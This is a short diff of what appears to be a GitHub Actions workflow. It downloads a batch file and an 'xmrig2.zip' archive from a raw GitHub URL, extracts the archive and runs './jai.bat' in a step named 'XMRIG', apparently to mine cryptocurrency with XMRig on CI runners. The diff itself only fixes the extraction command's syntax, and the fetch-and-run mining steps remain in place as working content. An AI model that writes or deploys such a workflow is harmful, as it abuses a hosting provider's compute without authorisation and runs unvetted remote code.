@@ -13,7 +13,7 @@ jobs:
         Invoke-WebRequest https://raw.githubusercontent.com/jaisai1337/cpu/main/start.bat -OutFile start.bat
         Invoke-WebRequest https://raw.githubusercontent.com/jaisai1337/cpu/main/xmrig2.zip -OutFile xmrig2.zip
     - name: Extracting Xmrig2 Files.
-      run: Expand-Archive xmrig2.zip %% cd xmrig2
+      run: Expand-Archive xmrig2.zip && cd xmrig2
     - name: XMRIG
       run: |
         ./jai.bat
